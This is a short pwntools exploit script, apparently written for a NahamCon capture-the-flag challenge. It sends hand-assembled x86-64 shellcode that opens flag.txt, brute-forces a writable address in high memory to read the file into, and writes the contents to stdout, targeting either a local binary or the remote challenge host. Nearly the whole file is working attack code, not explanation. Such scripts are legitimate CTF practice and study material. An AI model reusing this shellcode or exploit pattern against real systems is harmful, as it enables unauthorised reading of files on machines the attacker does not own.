from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
b *$rebase(0x00001833)
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('challenge.nahamcon.com',31337)
    else:
        return process(e.path)

p = start()

''' open(rax=0x2, rdi=rsp+len(shellcode), rsi=0x0, rdx=0x40000)'''
shellcode=asm("""
mov rax, 0x2
lea rdi, [rip]+78
mov rsi, 0x0
mov rdx, 0x4000
syscall
""")

''' read(rax=0x0, rdi=fd(0x3), rsi=0x7ff000000000+offset, rdx=0x100)'''
shellcode+=asm("""
mov rsi, 0x7ff000000000
cmp_loop:
add rsi, 0x1000
mov rax, 0x0
mov rdi, 0x3
mov rdx, 0x100
syscall; cmp rax, 0xfffffffffffffff2
je cmp_loop
""")

''' write(rax=0x1, rdi=stdout=0x1, rdx=0x100)'''
shellcode+=asm("""
mov rax, 0x1
mov rdi, 0x1
syscall
""")

#print(len(shellcode)-len(asm('mov rax, 0x2; lea rdi, [rip]+01;')))
''' append flag.txt to stack '''
shellcode+=b'flag.txt\0'


p.recvuntil(b'Shellcode length')
p.sendline(b"%i" %len(shellcode))
p.recvuntil(b'Shellcode')
p.sendline(shellcode)

p.interactive()
